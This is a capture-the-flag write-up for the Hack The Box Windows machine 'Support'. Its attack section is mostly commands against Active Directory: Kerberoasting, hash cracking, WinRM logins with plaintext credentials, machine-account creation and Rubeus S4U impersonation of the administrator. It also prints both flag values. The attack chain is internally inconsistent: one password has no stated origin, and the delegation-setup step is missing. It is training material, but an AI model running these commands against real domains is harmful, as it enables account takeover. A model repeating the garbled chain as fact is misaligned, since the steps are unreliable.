---
layout: writeup
name: "Support"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/support/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---
# 🧪 Machine Name: `Support`

**Platform:** Hack The Box  
**IP Address:** `10.129.230.181`  
**Difficulty:** Easy  
**Author:** ARZ101  

---

## 🧭 Overview

Support is an Easy-level Windows machine focusing on Active Directory enumeration and abuse. The foothold involves Kerberos and LDAP enumeration followed by abusing Service Principal Names (SPNs), MachineAccountQuota, and S4U delegation for privilege escalation to Administrator.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -sC -sV -oN nmap.txt 10.129.230.181
```

- Ports 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, and 3389 open (standard for a Domain Controller).

---

## 🚪 LDAP + Kerberos Enumeration

### Kerberos Pre-Auth Check

```bash
GetNPUsers.py support.htb/ -no-pass -usersfile users.txt -dc-ip 10.129.230.181
```

- No AS-REP roasting candidates found.

### LDAP Enumeration

```bash
windapsearch-linux-amd64 -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc 10.129.230.181 users
```

- Found SPNs using `GetUserSPNs.py`.

---

## 💥 Exploitation

### Kerberoasting

```bash
GetUserSPNs.py support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc-ip 10.129.230.181 -request
```

- Crack SPN hash:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

- Found credentials for user: `support : Ironside47pleasure40Watchful`

---

## 🪟 Foothold: Evil-WinRM

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

---

## 🧠 Privilege Escalation

### Machine Account Abuse

- Add a new machine account (if MachineAccountQuota > 0):

```powershell
New-MachineAccount -MachineAccount UwU -Password (ConvertTo-SecureString '123456' -AsPlainText -Force)
```

- Extract RC4 hash:

```bash
impacket-secretsdump support/ldap@support.htb -hashes :<ntlm> -just-dc-user UwU$
```

- Abuse S4U with Rubeus:

```bash
Rubeus.exe s4u /user:UwU$ /password:123456 /domain:support.htb /impersonateuser:administrator /rc4:<NTLM> /msdsspn:host/dc.support.htb /nowrap
```

- Inject ticket with Mimikatz or Rubeus.

---

## 🏁 Privilege Escalation: Administrator Shell

- Use the forged TGS to get an Administrator shell via Evil-WinRM:

```bash
export KRB5CCNAME=~/UwU.ccache
evil-winrm -i support.htb -u administrator -k
```

---

## 🧾 Flags

- `user.txt`: `d7e3ad265a337cb48fd74fd3e6f346cd`
- `root.txt`: `8bcdfd59f348a37e9457649bdc554c77`

---

## 🧠 Lessons Learned

- Kerberoasting and SPN abuse are critical AD foothold techniques.
- MachineAccountQuota allows low-priv users to escalate via S4U delegation.
- Tools like `Rubeus` and `impacket` are essential for advanced AD attacks.

---

![Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/support.png)